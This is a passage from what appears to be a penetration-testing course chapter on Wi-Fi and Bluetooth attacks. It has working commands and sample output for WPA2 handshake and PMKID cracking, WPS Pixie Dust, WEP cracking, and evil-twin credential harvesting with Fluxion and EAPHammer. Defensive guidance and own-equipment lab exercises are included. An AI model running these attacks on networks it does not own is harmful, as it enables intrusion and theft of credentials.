hcxpcapngtool -o hash.hc22000 handshake-01.cap
# Expected:
# reading from handshake-01.cap...
# summary:
# --------
# file name........................: handshake-01.cap
# handshakes (best)................: 1
# PMKID (best).....................: 0
# written to hash.hc22000..........: 1

# Run hashcat with GPU
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
# -m 22000  : WPA-PBKDF2-PMKID+EAPOL hash mode

# Expected output:
# hashcat (v6.2.6) starting
# ...
# Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
# Speed.#1.........:   125.3 kH/s (8.12ms)
# ...
# aabbccdd...:password123
# Session..........: hashcat
# Status...........: Cracked

# Hashcat with rules for better coverage
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Show cracked passwords
hashcat -m 22000 hash.hc22000 --show
```

{: .tip }
> GPU cracking is dramatically faster than CPU. A modern GPU can test ~500,000 WPA2 passwords per second vs ~2,000/s on CPU. Cloud GPU instances (AWS p3, Google Cloud GPU) can be rented for high-speed cracking during authorized engagements.

### PMKID Attack (Clientless)

Discovered by Jens "atom" Steube (hashcat author) in 2018, the PMKID attack captures authentication material from the AP without needing a connected client or a full 4-way handshake.

**How It Works**:
- The AP includes a PMKID in the first EAPOL message (Message 1) of the 4-way handshake
- `PMKID = HMAC-SHA1-128(PMK, "PMK Name" || MAC_AP || MAC_Client)`
- The attacker initiates an association, captures the PMKID, and disconnects
- No deauthentication of existing clients is needed — **stealthier**

```bash
# Method 1: Using hcxdumptool
sudo hcxdumptool -i wlan0mon -o pmkid_capture.pcapng --filterlist_ap=targetlist.txt --filtermode=2
# Create targetlist.txt with target BSSID (no colons):
# AABBCCDDEEFF

# Let it run for 1-5 minutes, then Ctrl+C
# Expected:
# start capturing (stop with ctrl+c)
# PMKID:AABBCCDDEEFF -> 11223344556677889900aabbccddeeff

# Convert to hashcat format
hcxpcapngtool -o pmkid_hash.hc22000 pmkid_capture.pcapng
# Expected:
# PMKID (best).....................: 1
# written to pmkid_hash.hc22000...: 1

# Crack with hashcat
hashcat -m 22000 pmkid_hash.hc22000 /usr/share/wordlists/rockyou.txt

# Method 2: Using hcxdumptool with broader scan
sudo hcxdumptool -i wlan0mon -o dump.pcapng --active_beacon --enable_status=15
# Captures PMKIDs from all responding APs
```

{: .note }
> Not all APs send PMKIDs in the first EAPOL message. This depends on the AP firmware and vendor implementation. The PMKID attack works on a significant number of consumer routers but is not universally applicable.

### Dictionary vs Brute Force vs Rule-Based Attacks

| Method | Description | Speed | When to Use |
|--------|-------------|-------|-------------|
| **Dictionary** | Try every word in a wordlist | Fast | First attempt; covers common passwords |
| **Brute Force** | Try every possible combination | Very slow | Short passwords only (8-9 chars max for WPA) |
| **Rule-Based** | Apply transformations to dictionary words (capitalize, append numbers, leet speak) | Medium | After dictionary fails; dramatically increases coverage |
| **Hybrid** | Dictionary + brute force mask (e.g., word + 4 digits) | Medium | Pattern-based passwords like `Summer2024!` |
| **Combinator** | Combine two wordlists | Medium | Multi-word passwords |

**Creating Targeted Wordlists**:

```bash
# crunch — generate all combinations of specified length and charset
crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 -o custom_wordlist.txt
# 8 12    : Min 8, max 12 characters
# WARNING: This generates MASSIVE files. Use with specific charsets only.

# Targeted crunch (e.g., company name + 4 digits)
crunch 12 12 -t CompanyN%%%%  -o company_wordlist.txt
# %    : Numeric digit
# @    : Lowercase letter
# ,    : Uppercase letter
# ^    : Special character

# cewl — scrape words from a website to build a targeted wordlist
cewl https://www.targetcompany.com -d 3 -m 6 -w company_words.txt
# -d 3   : Crawl depth of 3 levels
# -m 6   : Minimum word length of 6 characters
# -w     : Output file

# Add common patterns to scraped words
john --wordlist=company_words.txt --rules=best64 --stdout > enhanced_wordlist.txt

# Combine with known patterns
cat company_words.txt | sed 's/$/@123/' >> targeted_list.txt
cat company_words.txt | sed 's/$/@2024/' >> targeted_list.txt
cat company_words.txt | sed 's/$/@2025/' >> targeted_list.txt
```

### WPS Attacks

```bash
# Check if WPS is enabled on target AP
wash -i wlan0mon
# Expected:
# BSSID              Ch  dBm  WPS  Lck  Vendor    ESSID
# AA:BB:CC:DD:EE:01   6  -45  2.0  No   RalinkTe  HomeNetwork
# Lck = No means WPS is not locked out

# Reaver — WPS PIN brute force
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:01 -vv
# -vv   : Very verbose output
# Expected:
# [+] Waiting for beacon from AA:BB:CC:DD:EE:01
# [+] Received beacon from AA:BB:CC:DD:EE:01
# [+] Trying pin "12345670"
# [+] Sending authentication request
# [+] Sending association request
# [+] Associated with AA:BB:CC:DD:EE:01 (ESSID: HomeNetwork)
# [+] Sending EAPOL START request
# [+] Received identity request
# [+] Sending identity response
# [+] Received M1 message
# [+] Sending M2 message
# ...
# [+] WPS PIN: '13456789'
# [+] WPA PSK: 'ActualWiFiPassword123'
# [+] AP SSID: 'HomeNetwork'

# Pixie Dust attack (much faster — exploits weak RNG)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:01 -K 1 -vv
# -K 1  : Enable Pixie Dust attack
# Completes in seconds if the AP's chipset is vulnerable
# Expected:
# [+] Running pixiewps with the information, wait ...
# [Pixie-Dust]   PIN found: 13456789
# [+] WPS PIN: '13456789'
# [+] WPA PSK: 'ActualWiFiPassword123'

# Bully — alternative to Reaver
sudo bully wlan0mon -b AA:BB:CC:DD:EE:01 -v 3
# Some APs respond better to Bully than Reaver

# Handle WPS lockout (add delay between attempts)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:01 -d 60 -vv
# -d 60  : 60-second delay between attempts
```

{: .warning }
> Many modern routers implement WPS lockout after 3--5 failed attempts, making brute force impractical. The Pixie Dust attack bypasses this limitation since it only needs a single WPS exchange. Always check for Pixie Dust vulnerability first.

---

## WEP Cracking (Legacy — Educational)

{: .note }
> WEP has been deprecated since 2004 and is rarely found in modern networks. This section is included for educational purposes and for understanding wireless security history. If you find WEP during an engagement, the finding is "critical" regardless of the key complexity.

### ARP Replay Attack

The most common WEP cracking technique generates additional IVs by replaying captured ARP requests:

```bash
# Step 1: Start monitor mode and capture
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:03 -w wep_capture wlan0mon

# Step 2: Fake authentication to associate with the AP
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:03 -h YOUR_MAC wlan0mon
# Expected:
# Sending Authentication Request (Open System)
# Authentication successful
# Sending Association Request
# Association successful :-)

# Step 3: ARP replay — capture an ARP packet and replay it
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:03 -h YOUR_MAC wlan0mon
# Expected:
# Saving ARP requests in replay_arp-0228-143500.cap
# Read 12345 packets (got 1 ARP requests and 2345 ACKs), sent 5678 packets...(510 pps)

# Step 4: Once enough IVs are collected (~20,000-40,000), crack the key
aircrack-ng wep_capture-01.cap
# Expected:
#                               Aircrack-ng 1.7
#
#                   [00:00:03] Tested 834 keys (got 43218 IVs)
#
#    KB    depth   byte(vote)
#     0    0/ 1    A3(45312) 1F(43008) ...
#     1    0/ 1    B7(44800) 2C(43264) ...
#     2    0/ 3    5E(43776) 88(42752) ...
#     3    0/ 2    9D(44288) F1(43520) ...
#     4    2/ 5    C2(42240) 7A(41984) ...
#
#              KEY FOUND! [ A3:B7:5E:9D:C2 ]
#     Decrypted correctly: 100%
```

### Fragmentation Attack

Used when no ARP traffic is available. Captures a small encrypted fragment to derive the PRGA (Pseudo-Random Generation Algorithm) keystream:

```bash
# Fragmentation attack
sudo aireplay-ng -5 -b AA:BB:CC:DD:EE:03 -h YOUR_MAC wlan0mon
# Captures a fragment and derives 1500 bytes of keystream
# Saves to fragment-XXXX-XXXXXX.xor

# Use the keystream to create a forged ARP packet
sudo packetforge-ng -0 -a AA:BB:CC:DD:EE:03 -h YOUR_MAC -k 255.255.255.255 -l 255.255.255.255 -y fragment-*.xor -w forged_arp.cap

# Replay the forged ARP to generate IVs
sudo aireplay-ng -2 -r forged_arp.cap wlan0mon
```

### Chopchop Attack

An alternative to fragmentation — decrypts a packet byte by byte without knowing the key:

```bash
# Chopchop attack
sudo aireplay-ng -4 -b AA:BB:CC:DD:EE:03 -h YOUR_MAC wlan0mon
# Decrypts a packet and saves the keystream
# Then use packetforge-ng as above
```

### Why WEP Should Never Be Used

- **Cracking time**: Minutes, regardless of key complexity (64-bit or 128-bit)
- **No amount of key rotation helps**: The IV weakness is fundamental
- **No client authentication**: Only the key is verified
- **Completely automated**: Tools like Wifite crack WEP without user intervention
- **Any traffic is sufficient**: Even without ARP, fragmentation or chopchop attacks work
- **Deprecated since 2004**: Over 20 years of known insecurity

---

## Automated Tools

### Wifite2

Wifite2 automates the entire wireless attack workflow — scanning, handshake capture, PMKID collection, WPS attacks, and WEP cracking.

```bash
# Basic scan and attack
sudo wifite --kill
# --kill  : Kill interfering processes automatically

# Expected output:
#   .               .
#  /|    WiFite2     |\
# |||   by derv82   |||
# |||   & kimocoder |||
#  \|               |/
#   '               '
#
#  [+] option: kill conflicting processes (Y)
#  [+] Using wlan0mon already in monitor mode
#
#    NUM  ESSID              CH  ENCR  POWER  WPS  CLIENT
#    ---  -----              --  ----  -----  ---  ------
#    1    HomeNetwork         6  WPA2  -45dB  Yes  1
#    2    OfficeWiFi          1  WPA2  -67dB  No   0
#    3    OldRouter          11  WEP   -78dB  No   0
#
#  [+] select target(s) (1-3) separated by commas, or 'all':

# Target specific encryption and bands
sudo wifite --kill --wpa --no-wps
# Only target WPA/WPA2 networks, skip WPS attacks

# Specify custom wordlist
sudo wifite --kill --dict /usr/share/wordlists/rockyou.txt

# PMKID-only attack (stealthier)
sudo wifite --kill --pmkid --no-deauth

# Attack flow for WPA2:
# 1. Attempts PMKID capture (no deauth needed)
# 2. If PMKID fails, captures handshake via deauth
# 3. Runs aircrack-ng with specified wordlist
# 4. Reports results
```

### Fern WiFi Cracker (GUI)

Fern provides a graphical interface for wireless attacks, suitable for beginners:

```bash
# Launch Fern (pre-installed in Kali)
sudo fern-wifi-cracker

# GUI workflow:
# 1. Select wireless interface from dropdown
# 2. Click "Scan for Access Points"
# 3. Click on WPA or WEP tab to see networks
# 4. Select a target network
# 5. Choose attack method and wordlist
# 6. Click "Attack"
```

### Fluxion (Evil Twin Framework)

Fluxion automates Evil Twin attacks with captive portal credential harvesting:

```bash
# Install Fluxion
git clone https://github.com/FluxionNetwork/fluxion.git
cd fluxion

# Run
sudo ./fluxion.sh

# Fluxion workflow:
# 1. Scans for target networks
# 2. Captures a WPA handshake from the target
# 3. Creates a fake AP with the same SSID
# 4. Deauths clients from the real AP
# 5. Clients connect to the fake AP
# 6. Presents a captive portal asking for the WiFi password
# 7. Validates entered password against captured handshake
# 8. Reports the correct password
```

{: .danger }
> Fluxion and Evil Twin attacks involve impersonating legitimate networks and potentially capturing user credentials. These attacks must **never** be performed without explicit written authorization. Using them against networks you do not own is a serious criminal offense.

---

## Evil Twin Attacks (Conceptual)

### What Is an Evil Twin AP?

An Evil Twin is a rogue access point configured to mimic a legitimate network. When clients connect to the Evil Twin instead of the real AP, the attacker can intercept, modify, or inject traffic.

**Attack Flow**:

```
                                    Attacker
                                       |
  Legitimate AP                   Evil Twin AP
  SSID: "CoffeeShop"             SSID: "CoffeeShop"
  Channel: 6                      Channel: 1
  Signal: -65 dBm                 Signal: -30 dBm (closer/stronger)
       |                               |
       |  ← deauth flood              |
       |  (disrupts real AP)           |
       |                               |
  Clients disconnect ──────────> Clients auto-connect
                                 (stronger signal wins)
                                       |
                                 Captive portal OR
                                 transparent MitM
```

### Hostapd-mana

Hostapd-mana is a modified version of hostapd that adds features for penetration testing, including Evil Twin capabilities with enhanced client manipulation.

```bash
# Install hostapd-mana
sudo apt install hostapd-mana

# Basic configuration file (hostapd-mana.conf)
# interface=wlan1           # Second wireless interface for the fake AP
# driver=nl80211
# ssid=TargetNetwork
# channel=6
# hw_mode=g
# ieee80211n=1
# wpa=2
# wpa_key_mgmt=WPA-PSK
# wpa_passphrase=any_password_here
# mana_wpaout=/tmp/mana_wpa_handshake.hccapx

# Launch
sudo hostapd-mana hostapd-mana.conf
```

### Captive Portal Credential Harvesting

The attacker creates an open Evil Twin AP with a captive portal that mimics a login page:

1. Client connects to the open Evil Twin AP
2. Any HTTP request is redirected to the captive portal
3. Portal displays a page asking for the WiFi password (or login credentials)
4. User enters credentials, which are captured by the attacker
5. Attacker validates the WiFi password against a previously captured handshake

### SSL Stripping Concepts

SSL stripping downgrades HTTPS connections to HTTP, allowing the attacker to read traffic in plaintext:

- Attacker intercepts the initial HTTP request (before HTTPS redirect)
- Attacker communicates with the server over HTTPS
- Attacker sends the response to the client over HTTP
- Modern mitigations: **HSTS** (HTTP Strict Transport Security), **HSTS preload lists**, browser warnings
- Most modern browsers and services use HSTS, making SSL stripping largely ineffective against major sites

### EAPHammer for WPA-Enterprise Attacks

EAPHammer targets WPA-Enterprise (802.1X) networks by creating a rogue RADIUS server:

```bash
# Install EAPHammer
git clone https://github.com/s0lst1c3/eaphammer.git
cd eaphammer
sudo ./setup.sh

# Create Evil Twin for WPA-Enterprise
sudo ./eaphammer --bssid AA:BB:CC:DD:EE:01 --essid CorpWiFi --channel 6 \
  --interface wlan1 --auth wpa-eap --creds

# EAPHammer workflow:
# 1. Creates fake AP mimicking the corporate WiFi
# 2. Runs a rogue RADIUS server
# 3. Clients connect and submit credentials (username + hash)
# 4. Captured RADIUS challenge/responses can be cracked offline
# 5. If the client accepts the rogue certificate, full credentials are captured
```

### Detection and Defense Against Evil Twins

| Defense | How It Helps |
|---------|-------------|
| **802.1X/EAP-TLS** | Mutual certificate authentication — client verifies the server certificate |
| **Certificate pinning** | Client rejects unknown/rogue RADIUS server certificates |
| **WIDS/WIPS** | Wireless Intrusion Detection/Prevention systems detect rogue APs |
| **WPA3** | PMF prevents deauthentication attacks that drive clients to the Evil Twin |
| **VPN** | Even if connected to an Evil Twin, VPN encrypts all traffic end-to-end |
| **HSTS** | Prevents SSL stripping on HTTPS sites |
| **User education** | Train users not to enter credentials on unexpected WiFi portal pages |

---

## Bluetooth Security

### Bluetooth Architecture and Protocols

Bluetooth operates in the 2.4 GHz ISM band (2.402--2.480 GHz) and uses frequency-hopping spread spectrum (FHSS) across 79 channels (1 MHz each) at 1600 hops/second.

**Bluetooth Versions**:

| Version | Year | Max Speed | Range | Key Feature |
|---------|------|-----------|-------|-------------|
| 1.0 | 1999 | 721 Kbps | ~10m | Basic rate |
| 2.0+EDR | 2004 | 3 Mbps | ~10m | Enhanced Data Rate |
| 3.0+HS | 2009 | 24 Mbps | ~10m | High Speed (802.11 channel) |
| 4.0 | 2010 | 1 Mbps BLE | ~100m | Bluetooth Low Energy (BLE) |
| 4.2 | 2014 | 1 Mbps BLE | ~100m | LE Data Length Extension, LE Privacy |
| 5.0 | 2016 | 2 Mbps BLE | ~300m | 4x range, 2x speed, broadcast extensions |
| 5.1 | 2019 | 2 Mbps BLE | ~300m | Direction finding (AoA/AoD) |
| 5.2 | 2020 | 2 Mbps BLE | ~300m | LE Audio, LC3 codec, Isochronous Channels |
| 5.3 | 2021 | 2 Mbps BLE | ~300m | Connection subrating, channel classification |
| 5.4 | 2023 | 2 Mbps BLE | ~300m | PAwR (Periodic Advertising with Responses) |

**Classic Bluetooth vs BLE**:

| Feature | Classic Bluetooth | Bluetooth Low Energy (BLE) |
|---------|------------------|---------------------------|
| Use case | Audio, file transfer, HID | Sensors, beacons, IoT, wearables |
| Power | Higher consumption | Ultra-low power |
| Connection | Always connected | Event-driven, short bursts |
| Protocol | L2CAP, RFCOMM, SDP | GATT, ATT, GAP |
| Pairing | PIN/SSP | Just Works, Passkey, OOB, Numeric Comparison |

### Bluetooth Scanning

```bash
# Discover Classic Bluetooth devices
hcitool scan
# Expected:
# Scanning ...
#   AA:BB:CC:DD:EE:11   John's iPhone
#   AA:BB:CC:DD:EE:22   Samsung Galaxy S24
#   AA:BB:CC:DD:EE:33   JBL Speaker

# Inquiry scan (more detailed)
hcitool inq
# Expected:
# Inquiring ...
#   AA:BB:CC:DD:EE:11   clock offset: 0x5678   class: 0x7a020c
#   AA:BB:CC:DD:EE:22   clock offset: 0x1234   class: 0x5a020c

# Service discovery — enumerate available services on a device
sdptool browse AA:BB:CC:DD:EE:11
# Expected:
# Browsing AA:BB:CC:DD:EE:11 ...
# Service Name: Headset Audio Gateway
# Service RecHandle: 0x10001
# Service Class ID List:
#   "Headset Audio Gateway" (0x1112)
# Protocol Descriptor List:
#   "L2CAP" (0x0100)
#   "RFCOMM" (0x0003)
#     Channel: 12
# Profile Descriptor List:
#   "Headset" (0x1108)
#     Version: 0x0102

# Modern interface — bluetoothctl
bluetoothctl
# [bluetooth]# power on
# [bluetooth]# agent on
# [bluetooth]# scan on
# Expected:
# [NEW] Device AA:BB:CC:DD:EE:11 John's iPhone
# [NEW] Device AA:BB:CC:DD:EE:22 Samsung Galaxy S24
# [bluetooth]# info AA:BB:CC:DD:EE:11
# Device AA:BB:CC:DD:EE:11 (public)
#   Name: John's iPhone
#   Alias: John's iPhone
#   Class: 0x007a020c
#   Paired: no
#   Trusted: no
#   Blocked: no
#   Connected: no
#   LegacyPairing: no
#   UUID: OBEX Object Push    (00001105-0000-1000-8000-00805f9b34fb)
#   UUID: Audio Source         (0000110a-0000-1000-8000-00805f9b34fb)
# [bluetooth]# scan off
# [bluetooth]# exit

# Scan for BLE devices
sudo hcitool lescan
# Expected:
# LE Scan ...
# AA:BB:CC:DD:EE:44 Fitbit Charge 5
# AA:BB:CC:DD:EE:55 (unknown)
# AA:BB:CC:DD:EE:66 Tile Tracker
```

### BlueZ Toolkit

BlueZ is the official Linux Bluetooth protocol stack. It includes several tools for Bluetooth interaction:

| Tool | Purpose |
|------|---------|
| `hciconfig` | Configure Bluetooth adapters (similar to ifconfig for WiFi) |
| `hcitool` | Scan, connect, and interact with Bluetooth devices |
| `sdptool` | Service Discovery Protocol tool |
| `bluetoothctl` | Modern interactive Bluetooth control |
| `l2ping` | Ping a Bluetooth device via L2CAP |
| `rfcomm` | RFCOMM serial port connections |

```bash
# List Bluetooth adapters
hciconfig -a
# Expected:
# hci0:   Type: Primary  Bus: USB
#         BD Address: 00:11:22:33:44:55  ACL MTU: 1021:8  SCO MTU: 64:1
#         UP RUNNING
#         ...

# Enable Bluetooth adapter
sudo hciconfig hci0 up

# L2CAP ping (check if a device is reachable)
sudo l2ping -c 3 AA:BB:CC:DD:EE:11
# Expected:
# Ping: AA:BB:CC:DD:EE:11 from 00:11:22:33:44:55 (data size 44) ...
# 44 bytes from AA:BB:CC:DD:EE:11 id 0 time 23.45ms
# 44 bytes from AA:BB:CC:DD:EE:11 id 1 time 18.72ms
# 44 bytes from AA:BB:CC:DD:EE:11 id 2 time 21.33ms
```

### Bluetooth Attacks

**Bluejacking** — Sending unsolicited messages to a Bluetooth device:
- Exploits the OBEX Object Push profile
- Sends vCard/message to device without pairing
- Annoying but generally harmless
- Most modern devices reject unsolicited OBEX transfers

**Bluesnarfing** — Unauthorized access to data on a Bluetooth device:
- Exploits OBEX Push profile vulnerabilities
- Can access contacts, calendars, messages, files
- Requires the target device to be discoverable and have vulnerable firmware
- Largely mitigated in modern Bluetooth implementations

**Bluebugging** — Taking control of a Bluetooth device:
- Exploits AT command access over RFCOMM
- Can make calls, send SMS, read data on vulnerable phones
- Originally affected early Bluetooth phones (2004 era)
- Modern devices are generally not vulnerable

**KNOB Attack (Key Negotiation of Bluetooth)**:
- Discovered in 2019, affects Classic Bluetooth
- Attacker forces entropy reduction during key negotiation
- Reduces the session key to 1 byte of entropy
- Allows brute-forcing the session key in real time
- Affects all Bluetooth BR/EDR devices using standard pairing
- Mitigated by enforcing minimum key entropy (7+ bytes)

**BLE Sniffing**:

```bash
# BLE sniffing requires specialized hardware:
# - Ubertooth One ($125) — dedicated Bluetooth sniffer
# - nRF52840 dongle ($10) — Nordic Semiconductor, supports BLE sniffing
# - HackRF One — SDR that can capture Bluetooth (limited)

# With Ubertooth One
ubertooth-btle -f -c AA:BB:CC:DD:EE:44
# -f     : Follow connections
# -c     : Target device address
# Captures BLE advertisement and connection data
```

### BLE GATT Enumeration

GATT (Generic Attribute Profile) defines how BLE devices expose data as services and characteristics.

```bash
# Connect to a BLE device and enumerate services
gatttool -b AA:BB:CC:DD:EE:44 -I
# [AA:BB:CC:DD:EE:44][LE]> connect
# Attempting to connect to AA:BB:CC:DD:EE:44
# Connection successful

# Discover primary services
# [AA:BB:CC:DD:EE:44][LE]> primary
# attr handle: 0x0001, end grp handle: 0x0005 uuid: 00001800-0000-1000-8000-00805f9b34fb
# attr handle: 0x0006, end grp handle: 0x0009 uuid: 00001801-0000-1000-8000-00805f9b34fb
# attr handle: 0x000a, end grp handle: 0x001a uuid: 0000180a-0000-1000-8000-00805f9b34fb
# (0x1800 = Generic Access, 0x1801 = Generic Attribute, 0x180a = Device Information)

# Read characteristics
# [AA:BB:CC:DD:EE:44][LE]> characteristics
# handle: 0x0002, char properties: 0x02, char value handle: 0x0003, uuid: 00002a00-...
# handle: 0x0004, char properties: 0x02, char value handle: 0x0005, uuid: 00002a01-...

# Read a specific characteristic value
# [AA:BB:CC:DD:EE:44][LE]> char-read-hnd 0x0003
# Characteristic value/descriptor: 46 69 74 62 69 74       ("Fitbit")

# Write to a characteristic (if writable)
# [AA:BB:CC:DD:EE:44][LE]> char-write-req 0x000f 0100
# Characteristic value was written successfully

# Using bettercap for BLE enumeration (modern alternative)
sudo bettercap
# >> ble.recon on
# >> ble.show
# >> ble.enum AA:BB:CC:DD:EE:44
```

{: .warning }
> BLE security is often overlooked by manufacturers. Many IoT devices, smart locks, fitness trackers, and medical devices transmit sensitive data over BLE with no encryption or use static passphrases. During IoT security assessments, BLE is frequently a high-value attack surface.

### btlejack and Ubertooth

```bash
# btlejack — BLE sniffing with nRF52 hardware
# Install
pip3 install btlejack

# Scan for BLE connections
btlejack -s
# Sniffs BLE advertisement channels and detects active connections

# Follow a specific connection
btlejack -f 0xAABBCCDD
# Captures all packets in the connection

# Ubertooth — dedicated Bluetooth sniffer hardware
# Spectrum analysis
ubertooth-specan
# Shows real-time 2.4 GHz spectrum (all Bluetooth, WiFi, etc.)

# Follow BLE connections
ubertooth-btle -f
# Follows all BLE connections in range

# Classic Bluetooth (BR/EDR) sniffing
ubertooth-btbb -l
# Captures Classic Bluetooth packets (LAP discovery)
```

---

## Wireless Defense Recommendations

### Network Configuration

| Defense Measure | Priority | Description |
|----------------|:--------:|-------------|
| **Migrate to WPA3** | Critical | Use WPA3-Personal (SAE) or WPA3-Enterprise (192-bit) |
| **Strong passphrases** | Critical | Minimum 15 characters, random or passphrase-style (e.g., `correct-horse-battery-staple-7`) |
| **Disable WPS** | Critical | WPS is a persistent vulnerability; disable it entirely in router settings |
| **802.1X/RADIUS** | High | Use individual authentication for enterprise networks |
| **Enable PMF (802.11w)** | High | Protects management frames from deauth/disassoc attacks |
| **Disable legacy protocols** | High | Disable WEP, TKIP, 802.11b if not needed |
| **Reduce transmit power** | Medium | Limit signal range to reduce the attack surface |
| **Change default credentials** | Critical | Change router admin password and default SSID |

### Understanding Limited Defenses

**MAC Filtering** — Does NOT provide security:

```bash
# An attacker can trivially discover allowed MAC addresses from airodump-ng
# and then spoof their adapter's MAC:
sudo macchanger -m 11:22:33:44:55:01 wlan0
# Result: Attacker bypasses MAC filtering instantly
```

**Hidden SSID** — Does NOT provide security:

```bash
# Hidden SSIDs are revealed whenever any client connects
# Probe requests and association frames contain the SSID in cleartext
# Airodump-ng will show the SSID as soon as any client activity occurs
```

{: .note }
> MAC filtering and SSID hiding are "security through obscurity" measures. They add minor inconvenience to an attacker (seconds of additional work) but provide no real security. Do not rely on them as security controls — use proper encryption and authentication instead.

### Enterprise Security

**802.1X/RADIUS Architecture**:

```
Client (Supplicant) ←→ AP (Authenticator) ←→ RADIUS Server
        |                     |                    |
    EAP exchange         Forwards EAP         Validates
    (credentials)        to RADIUS             credentials
        |                     |                    |
    Receives PMK          Receives PMK         Generates PMK
    from handshake        from RADIUS          from auth data
```

**Best Practices for Enterprise Wireless**:
- Use **EAP-TLS** with client certificates for highest security
- If using PEAP, enforce server certificate validation on clients
- Use a dedicated VLAN for wireless traffic
- Implement network access control (NAC) for device posture assessment
- Deploy WIDS/WIPS sensors throughout the facility

### WIDS/WIPS Systems

Wireless Intrusion Detection/Prevention Systems monitor the RF environment for threats:

| Detection Capability | Description |
|---------------------|-------------|
| **Rogue AP detection** | Identifies unauthorized APs on the network |
| **Evil Twin detection** | Detects APs impersonating legitimate SSIDs |
| **Deauth flood detection** | Alerts on deauthentication frame storms |
| **Client misassociation** | Detects clients connecting to unauthorized APs |
| **Ad-hoc network detection** | Identifies peer-to-peer wireless connections |
| **WEP/WPA usage** | Alerts on weak encryption protocols |

**Open-Source WIDS Options**:
- **Kismet** — Full-featured wireless monitoring framework
- **OpenWIPS-ng** — Open-source WIPS by the aircrack-ng team
- **Snort Wireless** — Snort with wireless-specific rules

### Network Segmentation

```
                         [Internet]
                             |
                         [Firewall]
                             |
                    ┌────────┼────────┐
                    |        |        |
               [VLAN 10] [VLAN 20] [VLAN 30]
               Corporate   Guest    IoT
               WiFi        WiFi     Devices
               WPA3-Ent    WPA3     WPA2-PSK
               Full access Internet  Isolated
                           only      subnet
```

- **Corporate VLAN**: WPA3-Enterprise, 802.1X, full network access
- **Guest VLAN**: WPA3-Personal or OWE, internet-only, client isolation enabled
- **IoT VLAN**: Isolated subnet, strict firewall rules, no access to corporate resources
- **Client isolation**: Prevent wireless clients from communicating with each other (AP-level setting)

---

## Hands-On Exercises

{: .danger }
> **All exercises must be performed on your own equipment only.** Set up a dedicated test AP (an old router or a Raspberry Pi with hostapd) and use your own devices as clients. Never test on networks you do not own.

### Exercise 1: Monitor Mode and Network Scanning

**Objective**: Put your wireless adapter into monitor mode and scan for wireless networks.

**Setup**: USB WiFi adapter connected to Kali VM via UTM USB passthrough.

```bash
# Step 1: Verify adapter detection
iwconfig
iw dev

# Step 2: Check for and kill interfering processes
sudo airmon-ng check kill

# Step 3: Enable monitor mode
sudo airmon-ng start wlan0

# Step 4: Verify monitor mode
iwconfig wlan0mon

# Step 5: Scan all networks
sudo airodump-ng wlan0mon

# Let it run for 30-60 seconds, observe:
# - Network names (ESSID)
# - Encryption types (WEP, WPA, WPA2, WPA3, OPN)
# - Signal strengths (PWR)
# - Connected clients (STATION section)
# - Channels in use

# Step 6: Document your findings (your own networks only)
# Note the BSSID, channel, encryption, and number of clients
# for YOUR test network

# Step 7: Stop monitor mode when done
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

**Expected Outcome**: You can see all nearby wireless networks, their encryption types, channels, and connected clients. You understand the airodump-ng output format.

---

### Exercise 2: Capture a WPA2 Handshake from Your Own AP

**Objective**: Capture the WPA2 4-way handshake from your own test access point.

**Setup**: Your own AP with WPA2-PSK configured. A client device (phone or laptop) connected to it.

```bash
# Step 1: Start monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Step 2: Identify your test AP
sudo airodump-ng wlan0mon
# Note your AP's BSSID, channel, and a connected client's MAC

# Step 3: Start targeted capture (replace with YOUR values)
sudo airodump-ng -c [CHANNEL] --bssid [YOUR_AP_BSSID] -w exercise2 wlan0mon

# Step 4: In a second terminal, send deauth to force reconnection
sudo aireplay-ng -0 3 -a [YOUR_AP_BSSID] -c [YOUR_CLIENT_MAC] wlan0mon

# Step 5: Watch for "WPA handshake: [BSSID]" in the airodump-ng window
# This confirms the handshake was captured

# Step 6: Verify the capture file
aircrack-ng exercise2-01.cap
# Should show "1 handshake" for your network

# Step 7: Clean up
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

**Expected Outcome**: A `.cap` file containing the WPA2 4-way handshake from your own AP. The airodump-ng output shows the handshake confirmation.

---

### Exercise 3: Crack Your Own WPA2 Password with Aircrack-ng

**Objective**: Use the captured handshake to recover your own WPA2 password via dictionary attack.

**Setup**: The handshake capture file from Exercise 2. Set your test AP's password to something in the `rockyou.txt` wordlist (e.g., `password123` or `iloveyou`) for this exercise.

```bash
# Step 1: Verify you have a valid handshake
aircrack-ng exercise2-01.cap

# Step 2: Ensure rockyou.txt is available
ls -la /usr/share/wordlists/rockyou.txt
# If compressed:
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Step 3: Run the dictionary attack
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [YOUR_AP_BSSID] exercise2-01.cap

# Step 4: Observe the cracking speed and progress
# On a VM, expect ~2,000-5,000 keys/second
# A common password should be found within minutes

# Step 5: Note the result
# KEY FOUND! [ your_password_here ]

# Step 6: Now change your AP's password to something strong
# (15+ characters, not in any wordlist) and try again
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [YOUR_AP_BSSID] exercise2-01.cap
# This time it should NOT find the key — demonstrating the importance
# of strong passwords

# Bonus: Try converting to hashcat format for GPU cracking
hcxpcapngtool -o exercise2.hc22000 exercise2-01.cap
hashcat -m 22000 exercise2.hc22000 /usr/share/wordlists/rockyou.txt
```

**Expected Outcome**: Aircrack-ng recovers your weak test password. When tested with a strong password, the dictionary attack fails, demonstrating why password complexity matters for WPA2.

---

### Exercise 4: Perform a PMKID Capture

**Objective**: Attempt a PMKID-based attack against your own AP (no client deauthentication required).

**Setup**: Your own AP with WPA2-PSK. No connected clients are needed.

```bash
# Step 1: Start monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Step 2: Create a target list with your AP's BSSID (no colons)
echo "AABBCCDDEEFF" > /tmp/target.txt
# Replace AABBCCDDEEFF with your actual AP BSSID without colons

# Step 3: Run hcxdumptool to capture PMKID
